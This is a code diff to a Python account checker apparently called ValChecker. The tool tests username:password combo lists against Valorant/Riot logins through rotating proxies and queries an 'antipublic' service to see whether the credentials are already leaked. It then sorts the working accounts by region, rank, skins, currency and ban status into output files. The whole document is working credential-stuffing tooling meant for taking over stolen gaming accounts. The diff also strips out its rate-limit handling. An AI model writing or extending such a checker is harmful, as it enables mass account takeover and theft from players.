@@ -115,54 +115,44 @@ class simplechecker:
         self.parentpath = os.path.abspath(os.path.join(path, os.pardir))
         print(proxylist)
         self.proxylist = proxylist
-        self.inrlimit = int(0)
-        self.max_rlimits = int(settings["max_rlimits"])
-        self.rlimit_wait = int(settings["rlimit_wait"])
+        self.inrlimit = 0
         self.cooldown = int(settings["cooldown"])
-        self.esttime = str("N/A")
-        self.newfolder = bool(settings["new_folder"])
-        if self.newfolder:
-            dtnw = str(datetime.now()).replace(" ", "_").replace(":", ".")
-            self.outpath = self.parentpath + f"/output/{dtnw}"
-            os.mkdir(self.outpath)
-        else:
-            self.outpath = self.parentpath + "/output"
+        self.check_banned = bool(settings["check_banned"])
+        self.esttime = "N/A"
+        dtnw = str(datetime.now()).replace(" ", "_").replace(":", ".")
+        self.outpath = self.parentpath + f"/output/{dtnw}"
+        os.mkdir(self.outpath)
 
-        self.send_tempban = bool(False)
-        self.send_woskins = bool(False)
-        self.send_wfshorty = bool(False)
-        self.send_stats = bool(False)
-        self.send_ukreg = bool(False)
+        self.skip_kr = bool(settings["skip_kr"])
         # print(self.send_stats,self.send_tempban,self.send_ukreg,self.send_wfshorty,self.send_woskins)
 
         # input()
 
-        self.cpm = int(0)
-        self.startedcount = int(0)
+        self.cpm = 0
+        self.startedcount = 0
         self.cpmtext = str(self.cpm)
 
-        self.checked = int(0)
-        self.private = int(-1)
+        self.checked = 0
+        self.private = -1
         self.useAP = bool(settings["antipublic"])
         if self.useAP:
             self.ap = antipublic.AntiPublic(
                 str(settings["antipublic_token"]), settings["session"]
             )
             if self.ap.test():
-                self.private = int(0)
+                self.private = 0
                 self.useAP = True
-        self.valid = int(0)
-        self.banned = int(0)
-        self.tempbanned = int(0)
-        self.skins = int(0)
-        self.unverifiedmail = int(0)
-        self.err = int(0)
-        self.retries = int(0)
-        self.rlimits = int(0)
-        self.riotlimitinarow = int(0)
-        self.count = int(0)
+            else:
+                self.useAP = False
+        self.valid = 0
+        self.banned = 0
+        self.tempbanned = 0
+        self.skins = 0
+        self.unverifiedmail = 0
+        self.err = 0
+        self.retries = 0
+        self.count = 0
         self.validlist = []
-        self.tempbannedlist = []
 
         self.proxycount = len(proxylist) if self.proxylist is not None else 0
 
@@ -224,19 +214,19 @@ class simplechecker:
             self.checked = input_.checked
             self.valid = input_.valid
             self.banned = input_.banned
-            self.tempbanned = len(input_.tempbanned)
+            self.tempbanned = input_.tempbanned
             self.skins = input_.wskins
             self.unverifiedmail = input_.umail
             self.err = input_.errors
             self.retries = input_.retries
-            self.rlimits = input_.rlimits
-            self.count = len(input_.tocheck + input_.checked)
+            self.count = len(input_.tocheck) + input_.checked
             self.ranks = input_.ranks
             self.skinsam = input_.skins
             self.locked = input_.locked
             self.regions = input_.regions
             accounts = input_.tocheck
             count = len(input_.tocheck)
+            vlchkr = input_
         else:
             accounts = input_
             open(f"{self.outpath}/record.vlchkr", "w").close()
@@ -250,7 +240,7 @@ class simplechecker:
                 )
             )
         except ValueError:
-            self.threadam = int(1)
+            self.threadam = 1
         self.threadam = int((
             self.threadam
             if 5000 > self.threadam > 0
@@ -286,20 +276,18 @@ class simplechecker:
                         tasks.append(task)
                         # print(f'Added task for account {us}:{ps}. Current tasks: {len(tasks)}')
                         num += 1
-                        vlchkr.checked = int(self.checked)
-                        vlchkr.valid = int(self.valid)
-                        vlchkr.banned = int(self.banned)
-                        vlchkr.tempbanned = list(self.tempbannedlist)
-                        vlchkr.wskins = int(self.skins)
-                        vlchkr.umail = int(self.unverifiedmail)
-                        vlchkr.errors = int(self.err)
-                        vlchkr.retries = int(self.retries)
-                        vlchkr.rlimits = int(self.rlimits)
-                        vlchkr.tocheck = list(accounts[num:])
-                        vlchkr.ranks = dict(self.ranks)
-                        vlchkr.skins = dict(self.skinsam)
-                        vlchkr.locked = int(self.locked)
-                        vlchkr.regions = dict(self.regions)
+                        vlchkr.checked = self.checked
+                        vlchkr.valid = self.valid
+                        vlchkr.banned = self.banned
+                        vlchkr.wskins = self.skins
+                        vlchkr.umail = self.unverifiedmail
+                        vlchkr.errors = self.err
+                        vlchkr.retries = self.retries
+                        vlchkr.tocheck = accounts[num:]
+                        vlchkr.ranks = self.ranks
+                        vlchkr.skins = self.skinsam
+                        vlchkr.locked = self.locked
+                        vlchkr.regions = self.regions
                         vlchkr.savefile()
                     except Exception as e:
                         print(e)
@@ -325,7 +313,6 @@ class simplechecker:
 
     async def checker(self, username, password) -> None:
         # print('running')
-        riotlimitinarow = int(0)
         proxy = sys.getproxy(self.proxylist)
         acc = str(f"{username}:{password}")
         space = str(" ")
@@ -343,33 +330,11 @@ class simplechecker:
                             )
                         self.err += 1
                     case 1:
-                        if riotlimitinarow < self.max_rlimits:
-                            if riotlimitinarow == 0:
-                                self.inrlimit += 1
-                                # print(sys.center(
-                                #    f'riot limit. waiting {self.rlimit_wait} seconds'))
-                            time.sleep(self.rlimit_wait)
-                            riotlimitinarow += 1
-                            continue
-                        else:
-                            # if self.print_sys==True:
-                            print(
-                                sys.center(
-                                    f"{self.max_rlimits} riot limits in a row. skipping"
-                                )
-                            )
-                            self.inrlimit -= 1
-                            riotlimitinarow = int(0)
-                            self.rlimits += 1
-                            self.checked += 1
+                        self.retries += 1
+                        if self.retries % 10 == 0:
                             self.printinfo()
-                            with open(
-                                f"{self.parentpath}/output/riot_limits.txt",
-                                "a",
-                                encoding="UTF-8",
-                            ) as file:
-                                file.write(f"\n{account.logpass}")
-                            break
+                        time.sleep(1)
+                        continue
                     case 6:
                         proxy = sys.getproxy(self.proxylist)
                         self.retries += 1
@@ -386,15 +351,17 @@ class simplechecker:
                         self.printinfo()
                         break
                     case 4:
-                        with open(
-                            f"{self.outpath}/permbanned.txt", "a", encoding="UTF-8"
-                        ) as file:
-                            file.write(f"{account.logpass}\n")
-                        self.banned += 1
-                        self.checked += 1
-                        self.printinfo()
-                        time.sleep(self.cooldown)
-                        break
+                        if not self.check_banned:
+                            with open(
+                                f"{self.outpath}/permbanned.txt", "a", encoding="UTF-8"
+                            ) as file:
+                                file.write(f"{account.logpass}\n")
+                            self.banned += 1
+                            self.checked += 1
+                            self.printinfo()
+                            time.sleep(self.cooldown)
+                            break
+                        account.isPermbanned = True
                     case 5:
                         self.retries += 1
                         if self.retries % 10 == 0:
@@ -402,104 +369,132 @@ class simplechecker:
                         time.sleep(1)
                         continue
                     case _:
-                        if self.useAP:
-                            account.private = self.ap.check(account.logpass)
-                        if account.unverifiedmail and account.banuntil is None:
-                            self.unverifiedmail += 1
-                        while True:
-                            sys.get_region(account)
-                            if account.region is None:
-                                sys.get_region2(account)
+                        pass
+                if self.useAP:
+                    account.private = self.ap.check(account.logpass)
+                if account.unverifiedmail and account.banuntil is None:
+                    self.unverifiedmail += 1
+                while True:
+                    sys.get_region(account)
+                    if account.region is None:
+                        sys.get_region2(account)
+                    else:
+                        sys.get_country_and_level_only(account)
+                    if account.region == "kr" and self.skip_kr:
+                        break
+                    if account.region != "N/A" and account.region != "":
+                        if account.banuntil is None and not account.isPermbanned:
+                            self.regions[account.region.lower().strip()] += 1
+                        account.rank = None
+                        try:
+                            if (
+                                int(account.lvl) < 20
+                                and account.banuntil is None
+                            ):
+                                self.locked += 1
+                                account.rank = "locked"
+                        except ValueError:
+                            pass
+                        if account.rank is None:
+                            check.ranked(account)
+                        if account.banuntil is None and not account.isPermbanned:
+                            try:
+                                self.ranks[
+                                    account.rank.strip().lower().split(" ")[0]
+                                ] += 1
+                            except Exception:
+                                self.ranks["unknown"] += 1
+                        check.skins_en(account)
+                        check.balance(account)
+                        skinscount = len(account.skins)
+                        if skinscount == 1 and account.skins[0] == "N/A":
+                            skinscount = int(-1)
+                        if skinscount > 0 and account.banuntil is None and not account.isPermbanned:
+                            self.skins += 1
+                            if skinscount > 200:
+                                self.skinsam["200+"] += 1
+                            elif skinscount > 165:
+                                self.skinsam["165-200"] += 1
+                            elif skinscount > 130:
+                                self.skinsam["130-165"] += 1
+                            elif skinscount > 100:
+                                self.skinsam["100-130"] += 1
+                            elif skinscount > 70:
+                                self.skinsam["70-100"] += 1
+                            elif skinscount > 40:
+                                self.skinsam["40-70"] += 1
+                            elif skinscount > 35:
+                                self.skinsam["35-40"] += 1
+                            elif skinscount > 20:
+                                self.skinsam["20-35"] += 1
+                            elif skinscount > 10:
+                                self.skinsam["10-20"] += 1
                             else:
-                                sys.get_country_and_level_only(account)
-
-                            if account.region != "N/A" and account.region != "":
-                                if account.banuntil is None:
-                                    self.regions[account.region.lower().strip()] += 1
-                                account.rank = None
-                                try:
-                                    if (
-                                        int(account.lvl) < 20
-                                        and account.banuntil is None
-                                    ):
-                                        self.locked += 1
-                                        account.rank = "locked"
-                                except ValueError:
-                                    pass
-                                if account.rank is None:
-                                    check.ranked(account)
-                                if account.banuntil is None:
-                                    try:
-                                        self.ranks[
-                                            account.rank.strip().lower().split(" ")[0]
-                                        ] += 1
-                                    except Exception:
-                                        self.ranks["unknown"] += 1
-                                check.skins_en(account)
-                                check.balance(account)
-                                skinscount = len(account.skins)
-                                if skinscount == 1 and account.skins[0] == "N/A":
-                                    skinscount = int(-1)
-                                if skinscount > 0 and account.banuntil is None:
-                                    self.skins += 1
-                                    if skinscount > 200:
-                                        self.skinsam["200+"] += 1
-                                    elif skinscount > 165:
-                                        self.skinsam["165-200"] += 1
-                                    elif skinscount > 130:
-                                        self.skinsam["130-165"] += 1
-                                    elif skinscount > 100:
-                                        self.skinsam["100-130"] += 1
-                                    elif skinscount > 70:
-                                        self.skinsam["70-100"] += 1
-                                    elif skinscount > 40:
-                                        self.skinsam["40-70"] += 1
-                                    elif skinscount > 35:
-                                        self.skinsam["35-40"] += 1
-                                    elif skinscount > 20:
-                                        self.skinsam["20-35"] += 1
-                                    elif skinscount > 10:
-                                        self.skinsam["10-20"] += 1
-                                    else:
-                                        self.skinsam["1-10"] += 1
-                                check.lastplayed(account)
-                                break
-                            else:
-                                account.vp, account.rp = str("N/A"), str("N/A")
-                                account.lastplayed = str("N/A")
-                                if account.banuntil is None:
-                                    self.ranks["unknown"] += 1
-                                    self.regions["unknown"] += 1
-                                account.rank = str("N/A")
-                                skinscount = str("N/A")
-                                account.skins = list(["N/A"])
-                                account.region = str("N/A")
-                            break
-                        # skinsformatted = '\n'.join(account.skins)
-                        skinsformatted = str(f"║{space*61}║")
-                        if len(account.skins) > 0:
-                            skinsformatted = str("\n".join(
-                                f"║{i+1}. {skin}{space*(61-len(f'{i+1}. {skin}'))}║"
-                                for i, skin in enumerate(account.skins)
-                            ))
-                        banuntil = account.banuntil
-                        unverifmail = account.unverifiedmail
-                        lvl = account.lvl
-                        reg = account.region
-                        country = account.country
-                        rank = account.rank
-                        sysrank = rank.strip().lower().split(" ")[0]
-                        lastplayed = account.lastplayed
-                        vp = account.vp
-                        rp = account.rp
-
-                        if account.banuntil is not None:
-                            self.tempbanned += 1
-                            self.tempbannedlist.append(acc)
-                            with open(
-                                f"{self.outpath}/tempbanned.txt", "a", encoding="UTF-8"
-                            ) as file:
-                                file.write(f"""
+                                self.skinsam["1-10"] += 1
+                        check.lastplayed(account)
+                        break
+                    else:
+                        account.vp, account.rp = str("N/A"), str("N/A")
+                        account.lastplayed = str("N/A")
+                        if account.banuntil is None:
+                            self.ranks["unknown"] += 1
+                            self.regions["unknown"] += 1
+                        account.rank = str("N/A")
+                        skinscount = str("N/A")
+                        account.skins = list(["N/A"])
+                        account.region = str("N/A")
+                    break
+                if account.region == "kr" and self.skip_kr:
+                    self.regions["kr"] += 1
+                    break
+                skinsformatted = str(f"║{space*61}║")
+                if len(account.skins) > 0:
+                    skinsformatted = str("\n".join(
+                        f"║{i+1}. {skin}{space*(61-len(f'{i+1}. {skin}'))}║"
+                        for i, skin in enumerate(account.skins)
+                    ))
+                banuntil = account.banuntil
+                unverifmail = account.unverifiedmail
+                lvl = account.lvl
+                reg = account.region
+                country = account.country
+                rank = account.rank
+                sysrank = rank.strip().lower().split(" ")[0]
+                lastplayed = account.lastplayed
+                vp = account.vp
+                rp = account.rp
+                if self.check_banned and account.isPermbanned:
+                    self.banned += 1
+                    with open(
+                        f"{self.outpath}/banned.txt", "a", encoding="UTF-8"
+                    ) as file:
+                        file.write(f"""
+╔═════════════════════════════════════════════════════════════╗
+║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
+║ Permanently banned {space*(61-len(f' Permanently banned'))}║
+║                                                             ║
+║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
+║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
+║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
+║ Creation date: {account.registerdate}{space*(61-len(f' Creation date: {account.registerdate}'))}║
+║ Gamename: {account.gamename}#{account.tagline}{space*(61-len(f' Gamename: {account.gamename}#{account.tagline}'))}║
+║ Private: {account.private}{space*(61-len(f' Private: {account.private}'))}║
+╠═════════════════════════════════════════════════════════════╣
+{skinsformatted}
+╚═════════════════════════════════════════════════════════════╝
+""")
+                    with open(
+                        f"{self.outpath}/banned_raw.txt",
+                        "a",
+                        encoding="UTF-8",
+                    ) as file:
+                        file.write(account.logpass + "\n")
+                if account.banuntil is not None and not account.isPermbanned:
+                    self.tempbanned += 1
+                    with open(
+                        f"{self.outpath}/tempbanned.txt", "a", encoding="UTF-8"
+                    ) as file:
+                        file.write(f"""
 ╔═════════════════════════════════════════════════════════════╗
 ║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
 ║ Banned until {banuntil}{space*(61-len(f' Banned until {banuntil}'))}║
@@ -514,25 +509,100 @@ class simplechecker:
 {skinsformatted}
 ╚═════════════════════════════════════════════════════════════╝
 """)
-                            with open(
-                                f"{self.outpath}/tempbanned_raw.txt",
-                                "a",
-                                encoding="UTF-8",
-                            ) as file:
-                                file.write(account.logpass + "\n")
+                    with open(
+                        f"{self.outpath}/tempbanned_raw.txt",
+                        "a",
+                        encoding="UTF-8",
+                    ) as file:
+                        file.write(account.logpass + "\n")
+                if account.banuntil is None and not account.isPermbanned:
+                    with open(
+                        f"{self.outpath}/valid.txt", "a", encoding="UTF-8"
+                    ) as file:
+                        file.write(f"""
+╔═════════════════════════════════════════════════════════════╗
+║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
+║                                                             ║
+║                                                             ║
+║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
+║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
+║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
+║ Creation date: {account.registerdate}{space*(61-len(f' Creation date: {account.registerdate}'))}║
+║ Gamename: {account.gamename}#{account.tagline}{space*(61-len(f' Gamename: {account.gamename}#{account.tagline}'))}║
+║ Private: {account.private}{space*(61-len(f' Private: {account.private}'))}║
+╠═════════════════════════════════════════════════════════════╣
+{skinsformatted}
+╚═════════════════════════════════════════════════════════════╝
+""")
+                    with open(
+                        f"{self.outpath}/valid_raw.txt", "a", encoding="UTF-8"
+                    ) as file:
+                        file.write(account.logpass + "\n")
+                    # sort
+                    self.valid += 1
+                    self.validlist.append(acc)
+                    if rank != "N/A" and reg != "N/A":
+                        if not exists(f"{self.outpath}/regions/"):
+                            os.mkdir(f"{self.outpath}/regions/")
+                        if not exists(f"{self.outpath}/regions/{reg}/"):
+                            os.mkdir(f"{self.outpath}/regions/{reg}/")
+                        with open(
+                            f"{self.outpath}/regions/{reg}/{sysrank}.txt",
+                            "a",
+                            encoding="UTF-8",
+                        ) as file:
+                            file.write(f"""
+╔═════════════════════════════════════════════════════════════╗
+║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
+║                                                             ║
+║                                                             ║
+║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
+║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
+║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
+║ Creation date: {account.registerdate}{space*(61-len(f' Creation date: {account.registerdate}'))}║
+║ Gamename: {account.gamename}#{account.tagline}{space*(61-len(f' Gamename: {account.gamename}#{account.tagline}'))}║
+║ Private: {account.private}{space*(61-len(f' Private: {account.private}'))}║
+╠═════════════════════════════════════════════════════════════╣
+{skinsformatted}
+╚═════════════════════════════════════════════════════════════╝
+""")
+                    with open(
+                        f"{self.outpath}/regions/{reg}/{sysrank}_raw.txt",
+                        "a",
+                        encoding="UTF-8",
+                    ) as file:
+                        file.write(account.logpass + "\n")
+                    if skinscount > 0 and reg != "N/A":
+                        if not exists(f"{self.outpath}/skins/"):
+                            os.mkdir(f"{self.outpath}/skins/")
+                        if skinscount > 200:
+                            path = f"{self.outpath}/skins/200+/"
+                        elif skinscount > 165:
+                            path = f"{self.outpath}/skins/165-200/"
+                        elif skinscount > 130:
+                            path = f"{self.outpath}/skins/130-165/"
+                        elif skinscount > 100:
+                            path = f"{self.outpath}/skins/100-130/"
+                        elif skinscount > 70:
+                            path = f"{self.outpath}/skins/70-100/"
+                        elif skinscount > 40:
+                            path = f"{self.outpath}/skins/40-70/"
+                        elif skinscount > 40:
+                            path = f"{self.outpath}/skins/40-70/"
+                        elif skinscount > 35:
+                            path = f"{self.outpath}/skins/35-40/"
+                        elif skinscount > 20:
+                            path = f"{self.outpath}/skins/20-35/"
+                        elif skinscount > 10:
+                            path = f"{self.outpath}/skins/10-20/"
                         else:
-                            # with open(f'{self.parentpath}/output/valid.json','r+',encoding='utf-8') as f:
-                            #    data=json.load(f)
-                            #    temp=data['valid']
-                            #    toadd={'LogPass':account,'region':reg,'rank':rank,'level':lvl,'lastmatch':lastplayed,'unverifiedmail':unverifmail,'vp':vp,'rp':rp,'skinscount':skinscount,f'skins':skins.strip('\n').split('\n')}
-                            #    temp.append(toadd)
-                            #    f.seek(0)
-                            #    json.dump(data, f, indent=4)
-                            #    f.truncate()
-                            with open(
-                                f"{self.outpath}/valid.txt", "a", encoding="UTF-8"
-                            ) as file:
-                                file.write(f"""
+                            path = f"{self.outpath}/skins/1-10/"
+                        if not exists(path):
+                            os.mkdir(path)
+                        with open(
+                            f"{path}/{reg}.txt", "a", encoding="UTF-8"
+                        ) as file:
+                            file.write(f"""
 ╔═════════════════════════════════════════════════════════════╗
 ║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
 ║                                                             ║
@@ -547,97 +617,10 @@ class simplechecker:
 {skinsformatted}
 ╚═════════════════════════════════════════════════════════════╝
 """)
-                            with open(
-                                f"{self.outpath}/valid_raw.txt", "a", encoding="UTF-8"
-                            ) as file:
-                                file.write(account.logpass + "\n")
-                        # sort
-                        if banuntil is None:
-                            self.valid += 1
-                            self.validlist.append(acc)
-                        bantext = " "
-                        if rank != "N/A" and reg != "N/A":
-                            if banuntil is not None:
-                                bantext = f" Banned until {banuntil}"
-                            if not exists(f"{self.outpath}/regions/"):
-                                os.mkdir(f"{self.outpath}/regions/")
-                            if not exists(f"{self.outpath}/regions/{reg}/"):
-                                os.mkdir(f"{self.outpath}/regions/{reg}/")
-                            with open(
-                                f"{self.outpath}/regions/{reg}/{sysrank}.txt",
-                                "a",
-                                encoding="UTF-8",
-                            ) as file:
-                                file.write(f"""
-╔═════════════════════════════════════════════════════════════╗
-║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
-║{bantext}{space*(61-len(bantext))}║
-║                                                             ║
-║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
-║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
-║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
-║ Creation date: {account.registerdate}{space*(61-len(f' Creation date: {account.registerdate}'))}║
-║ Gamename: {account.gamename}#{account.tagline}{space*(61-len(f' Gamename: {account.gamename}#{account.tagline}'))}║
-║ Private: {account.private}{space*(61-len(f' Private: {account.private}'))}║
-╠═════════════════════════════════════════════════════════════╣
-{skinsformatted}
-╚═════════════════════════════════════════════════════════════╝
-""")
-                            with open(
-                                f"{self.outpath}/regions/{reg}/{sysrank}_raw.txt",
-                                "a",
-                                encoding="UTF-8",
-                            ) as file:
-                                file.write(account.logpass + "\n")
-                        if skinscount > 0 and reg != "N/A" and banuntil is None:
-                            if not exists(f"{self.outpath}/skins/"):
-                                os.mkdir(f"{self.outpath}/skins/")
-                            if skinscount > 200:
-                                path = f"{self.outpath}/skins/200+/"
-                            elif skinscount > 165:
-                                path = f"{self.outpath}/skins/165-200/"
-                            elif skinscount > 130:
-                                path = f"{self.outpath}/skins/130-165/"
-                            elif skinscount > 100:
-                                path = f"{self.outpath}/skins/100-130/"
-                            elif skinscount > 70:
-                                path = f"{self.outpath}/skins/70-100/"
-                            elif skinscount > 40:
-                                path = f"{self.outpath}/skins/40-70/"
-                            elif skinscount > 40:
-                                path = f"{self.outpath}/skins/40-70/"
-                            elif skinscount > 35:
-                                path = f"{self.outpath}/skins/35-40/"
-                            elif skinscount > 20:
-                                path = f"{self.outpath}/skins/20-35/"
-                            elif skinscount > 10:
-                                path = f"{self.outpath}/skins/10-20/"
-                            else:
-                                path = f"{self.outpath}/skins/1-10/"
-                            if not exists(path):
-                                os.mkdir(path)
-                            with open(
-                                f"{path}/{reg}.txt", "a", encoding="UTF-8"
-                            ) as file:
-                                file.write(f"""
-╔═════════════════════════════════════════════════════════════╗
-║            | {account.logpass} |{space*(49-len(f'| {account.logpass} |'))}║
-║                                                             ║
-║                                                             ║
-║ Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}{space*(61-len(f' Full Access: {unverifmail} | Level: {lvl} | Region: {reg} , {country}'))}║
-║ Rank: {rank} | Last Played: {lastplayed}{space*(61-len(f' Rank: {rank} | Last Played: {lastplayed}'))}║
-║ Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}{space*(61-len(f' Valorant Points: {vp} | Radianite: {rp} | Skins: {skinscount}'))}║
-║ Creation date: {account.registerdate}{space*(61-len(f' Creation date: {account.registerdate}'))}║
-║ Gamename: {account.gamename}#{account.tagline}{space*(61-len(f' Gamename: {account.gamename}#{account.tagline}'))}║
-║ Private: {account.private}{space*(61-len(f' Private: {account.private}'))}║
-╠═════════════════════════════════════════════════════════════╣
-{skinsformatted}
-╚═════════════════════════════════════════════════════════════╝
-""")
-                            with open(
-                                f"{path}/{reg}_raw.txt", "a", encoding="UTF-8"
-                            ) as file:
-                                file.write(account.logpass + "\n")
+                        with open(
+                            f"{path}/{reg}_raw.txt", "a", encoding="UTF-8"
+                        ) as file:
+                            file.write(account.logpass + "\n")
             except Exception:
                 with open(
                     f"{self.parentpath}/log.txt",
@@ -652,9 +635,6 @@ class simplechecker:
             self.checked += 1
             if account.private:
                 self.private += 1
-            if riotlimitinarow > 0:
-                self.inrlimit -= 1
-            riotlimitinarow = int(0)
             self.printinfo()
             time.sleep(self.cooldown)
             break
@@ -671,25 +651,25 @@ class simplechecker:
             self.cpm = int(self.checked - self.startedcount)
             self.startedtesting = sys.getmillis()
             self.startedcount = int(self.checked)
-            self.cpmtext = str(f"↑ {self.cpm}" if self.cpm > prevcpm else f"↓ {self.cpm}")
+            self.cpmtext = f"↑ {self.cpm}" if self.cpm > prevcpm else f"↓ {self.cpm}"
             if self.cpm > 0:
                 self.esttime = sys.convert_to_preferred_format(
                     round((self.count - self.checked) / self.cpm * 60)
                 ) 
             else:
-                self.esttime = str("N/A")
+                self.esttime = "N/A"
 
         reset = Fore.RESET
         cyan = Fore.CYAN
         green = Fore.LIGHTGREEN_EX
         red = Fore.LIGHTRED_EX
-        space = str(" ")
-        privatepercent = str("-1%")
+        space = " "
+        privatepercent = "-1%"
         if self.useAP:
             privatepercent = float(self.private / self.valid * 100 if self.valid != 0 else 0.0)
-            privatepercent = str(f"{str(round(privatepercent,1))}%")
+            privatepercent = f"{str(round(privatepercent,1))}%"
         percent = float(self.valid / self.checked * 100 if self.checked != 0 else 0.0)
-        percent = str(f"{str(round(percent,1))}%")
+        percent = f"{str(round(percent,1))}%"
         ctypes.windll.kernel32.SetConsoleTitleW(
             f"ValChecker {self.version}  |  Checked {self.checked}/{self.count}  |  {self.cpmtext} CPM  |  Hitrate {percent}  |  Private Rate {privatepercent}  |  Est. time: {self.esttime}  |  {self.comboname}"
         )
@@ -705,9 +685,9 @@ class simplechecker:
 {cyan} ┃ [{reset}>{cyan}] {reset}Valid          >>:{cyan}[{green}{self.valid}{cyan}] ({percent}){space * (9 - len(str(self.valid))-len(percent))}┃ ┃ [{reset}>{cyan}] {reset}EU            >>:{cyan}[{green}{self.regions['eu']}{cyan}]{space * (18 - len(str(self.regions['eu'])))}┃ ┃ [{reset}>{cyan}] {reset}1-10            >>:{cyan}[{green}{self.skinsam['1-10']}{cyan}]{space * (29 - len(str(self.skinsam['1-10'])))}┃
 {cyan} ┃ [{reset}>{cyan}] {reset}Banned         >>:{cyan}[{red}{self.banned}{cyan}]{space * (12 - len(str(self.banned)))}┃ ┃ [{reset}>{cyan}] {reset}NA            >>:{cyan}[{green}{self.regions['na']}{cyan}]{space * (18 - len(str(self.regions['na'])))}┃ ┃ [{reset}>{cyan}] {reset}10-20           >>:{cyan}[{green}{self.skinsam['10-20']}{cyan}]{space * (29 - len(str(self.skinsam['10-20'])))}┃
 {cyan} ┃ [{reset}>{cyan}] {reset}TempBanned     >>:{cyan}[{Fore.YELLOW}{self.tempbanned}{cyan}]{space * (12 - len(str(self.tempbanned)))}┃ ┃ [{reset}>{cyan}] {reset}AP            >>:{cyan}[{green}{self.regions['ap']}{cyan}]{space * (18 - len(str(self.regions['ap'])))}┃ ┃ [{reset}>{cyan}] {reset}20-35           >>:{cyan}[{green}{self.skinsam['20-35']}{cyan}]{space * (29 - len(str(self.skinsam['20-35'])))}┃
-{cyan} ┃ [{reset}>{cyan}] {reset}Rate Limits    >>:{cyan}[{red}{self.rlimits}{cyan}]{space * (12 - len(str(self.rlimits)))}┃ ┃ [{reset}>{cyan}] {reset}BR            >>:{cyan}[{green}{self.regions['br']}{cyan}]{space * (18 - len(str(self.regions['br'])))}┃ ┃ [{reset}>{cyan}] {reset}35-40           >>:{cyan}[{green}{self.skinsam['35-40']}{cyan}]{space * (29 - len(str(self.skinsam['35-40'])))}┃
-{cyan} ┃ [{reset}>{cyan}] {reset}Errors         >>:{cyan}[{red}{self.err}{cyan}]{space * (12 - len(str(self.err)))}┃ ┃ [{reset}>{cyan}] {reset}KR            >>:{cyan}[{green}{self.regions['kr']}{cyan}]{space * (18 - len(str(self.regions['kr'])))}┃ ┃ [{reset}>{cyan}] {reset}40-70           >>:{cyan}[{green}{self.skinsam['40-70']}{cyan}]{space * (29 - len(str(self.skinsam['40-70'])))}┃
-{cyan} ┃ [{reset}>{cyan}] {reset}Retries        >>:{cyan}[{Fore.YELLOW}{self.retries}{cyan}]{space * (12 - len(str(self.retries)))}┃ ┃ [{reset}>{cyan}] {reset}LATAM         >>:{cyan}[{green}{self.regions['latam']}{cyan}]{space * (18 - len(str(self.regions['latam'])))}┃ ┃ [{reset}>{cyan}] {reset}70-100          >>:{cyan}[{green}{self.skinsam['70-100']}{cyan}]{space * (29 - len(str(self.skinsam['70-100'])))}┃
+{cyan} ┃ [{reset}>{cyan}] {reset}Errors         >>:{cyan}[{red}{self.err}{cyan}]{space * (12 - len(str(self.err)))}┃ ┃ [{reset}>{cyan}] {reset}BR            >>:{cyan}[{green}{self.regions['br']}{cyan}]{space * (18 - len(str(self.regions['br'])))}┃ ┃ [{reset}>{cyan}] {reset}35-40           >>:{cyan}[{green}{self.skinsam['35-40']}{cyan}]{space * (29 - len(str(self.skinsam['35-40'])))}┃
+{cyan} ┃ [{reset}>{cyan}] {reset}Retries        >>:{cyan}[{Fore.YELLOW}{self.retries}{cyan}]{space * (12 - len(str(self.retries)))}┃ ┃ [{reset}>{cyan}] {reset}KR            >>:{cyan}[{green}{self.regions['kr']}{cyan}]{space * (18 - len(str(self.regions['kr'])))}┃ ┃ [{reset}>{cyan}] {reset}40-70           >>:{cyan}[{green}{self.skinsam['40-70']}{cyan}]{space * (29 - len(str(self.skinsam['40-70'])))}┃
+{cyan} ┃                                     ┃ ┃ [{reset}>{cyan}] {reset}LATAM         >>:{cyan}[{green}{self.regions['latam']}{cyan}]{space * (18 - len(str(self.regions['latam'])))}┃ ┃ [{reset}>{cyan}] {reset}70-100          >>:{cyan}[{green}{self.skinsam['70-100']}{cyan}]{space * (29 - len(str(self.skinsam['70-100'])))}┃
 {cyan} ┃                                     ┃ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ ┃ [{reset}>{cyan}] {reset}100-130         >>:{cyan}[{green}{self.skinsam['100-130']}{cyan}]{space * (29 - len(str(self.skinsam['100-130'])))}┃
